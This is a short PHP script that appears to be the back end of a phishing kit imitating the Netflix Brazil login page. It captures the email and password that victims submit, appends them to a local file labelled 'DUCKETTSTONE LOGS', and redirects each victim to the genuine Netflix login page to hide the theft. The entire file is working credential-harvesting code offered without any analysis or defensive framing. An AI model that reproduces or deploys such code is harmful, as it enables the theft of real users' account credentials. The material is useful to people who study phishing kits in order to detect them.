<?php 
file_put_contents("login.txt", "[DUCKETTSTONE LOGS]" . "\n" . "Email: " . $_POST['userLoginId'] . "\n" . "Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('location:https://www.netflix.com/br/login');
exit();
?>